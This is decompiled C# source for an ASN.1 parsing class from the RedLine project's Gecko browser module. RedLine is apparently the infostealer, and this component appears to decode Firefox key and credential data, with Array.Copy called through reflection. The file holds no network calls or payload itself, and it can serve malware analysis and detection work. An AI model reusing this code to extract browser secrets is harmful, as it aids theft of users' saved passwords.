using System;
using System.Reflection;
using RedLine.Models.Gecko;

namespace RedLine.Logic.Browsers.Gecko
{
	// Token: 0x02000067 RID: 103
	public static class Asn1Factory
	{
		// Token: 0x060002C2 RID: 706 RVA: 0x0000C1E4 File Offset: 0x0000A3E4
		public static Asn1Object Create(byte[] dataToParse)
		{
			MethodInfo method = typeof(Array).GetMethod("Copy", new Type[]
			{
				typeof(Array),
				typeof(int),
				typeof(Array),
				typeof(int),
				typeof(int)
			});
			Asn1Object asn1Object = new Asn1Object();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				Asn1Type asn1Type = (Asn1Type)dataToParse[i];
				switch (asn1Type)
				{
				case Asn1Type.Integer:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.Integer,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int num = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					method.Invoke(null, new object[]
					{
						dataToParse,
						i + 2,
						array,
						0,
						num
					});
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.BitString:
				case Asn1Type.Null:
					break;
				case Asn1Type.OctetString:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.OctetString,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int num = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					method.Invoke(null, new object[]
					{
						dataToParse,
						i + 2,
						array,
						0,
						num
					});
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.ObjectIdentifier:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.ObjectIdentifier,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int num = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					method.Invoke(null, new object[]
					{
						dataToParse,
						i + 2,
						array,
						0,
						num
					});
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				default:
					if (asn1Type == Asn1Type.Sequence)
					{
						byte[] array;
						if (asn1Object.ObjectLength == 0)
						{
							asn1Object.ObjectType = Asn1Type.Sequence;
							asn1Object.ObjectLength = dataToParse.Length - (i + 2);
							array = new byte[asn1Object.ObjectLength];
						}
						else
						{
							asn1Object.Objects.Add(new Asn1Object
							{
								ObjectType = Asn1Type.Sequence,
								ObjectLength = (int)dataToParse[i + 1]
							});
							array = new byte[(int)dataToParse[i + 1]];
						}
						int num2 = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
						method.Invoke(null, new object[]
						{
							dataToParse,
							i + 2,
							array,
							0,
							array.Length
						});
						asn1Object.Objects.Add(Asn1Factory.Create(array));
						i = i + 1 + (int)dataToParse[i + 1];
					}
					break;
				}
			}
			return asn1Object;
		}
	}
}
